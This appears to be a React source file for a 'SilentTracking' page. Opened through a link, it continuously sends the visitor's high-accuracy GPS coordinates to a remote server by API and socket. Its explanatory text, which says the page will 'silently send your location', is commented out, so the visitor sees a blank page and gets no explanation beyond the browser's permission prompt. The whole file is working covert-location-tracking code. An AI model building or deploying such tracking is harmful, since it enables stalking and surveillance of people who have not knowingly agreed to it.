import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import io from "socket.io-client";
import axios from "axios";

const SilentTracking = () => {
  const { linkId } = useParams();
  const [personName, setPersonName] = useState("");
  const [status, setStatus] = useState("Verifying link...");
  const [socket, setSocket] = useState(null);
  const API = "https://find-device-server.onrender.com";

  // 1️⃣ Verify link
  useEffect(() => {
    const verifyLink = async () => {
      try {
        const res = await axios.get(`${API}/api/track/${linkId}`);
        if (res.data.valid) {
          setPersonName(res.data.personName);
          setStatus("Tracking started...");
        } else {
          setStatus("Invalid or expired link");
        }
      } catch (err) {
        console.error(err);
        setStatus("Error verifying link");
      }
    };
    verifyLink();
  }, [linkId]);

  // 2️⃣ Connect Socket.IO
  useEffect(() => {
    if (!personName) return;

    const newSocket = io(API, { query: { linkId } });

    newSocket.on("connect", () => {
      console.log("Connected to Socket.IO server:", newSocket.id);
    });

    newSocket.on("error", (err) => console.error("Socket error:", err));
    setSocket(newSocket);

    return () => newSocket.disconnect();
  }, [personName, linkId]);

  // 3️⃣ Watch geolocation
  useEffect(() => {
    if (!personName || !socket) return;

    if (!navigator.geolocation) {
      setStatus("Geolocation not supported on this device");
      return;
    }

    const sendLocation = (position) => {
      const { latitude, longitude, accuracy } = position.coords;
      const locationData = { lat: latitude, lng: longitude, accuracy };

      // Send via API
      axios
        .post(`${API}/api/track-location/${linkId}`, { location: locationData })
        .then((res) => {
          if (res.data.success)
            console.log("Location sent via API:", locationData);
        })
        .catch((err) => console.error("Error sending location:", err));

      // Send via Socket.IO
      socket.emit("share-location", { location: locationData }, (res) => {
        if (res?.success)
          console.log("Location sent via Socket:", locationData);
      });
    };

    const handleError = (err) => {
      console.error("Geolocation error:", err.message);
      setStatus(`Error: ${err.message}`);
    };

    const watcher = navigator.geolocation.watchPosition(
      sendLocation,
      handleError,
      {
        enableHighAccuracy: true,
        maximumAge: 5000,
        timeout: 10000,
      },
    );

    return () => navigator.geolocation.clearWatch(watcher);
  }, [personName, socket, linkId]);

  return (
    <div style={{ padding: "2rem", textAlign: "center" }}>
      {/* <h1>Silent Tracking</h1>
      <p>Person: {personName || "—"}</p>
      <p>Status: {status}</p>
      <p>This page will silently send your location to the server.</p>
      <p>⚠️ On mobile, please allow location permission if prompted.</p> */}
    </div>
  );
};

export default SilentTracking;
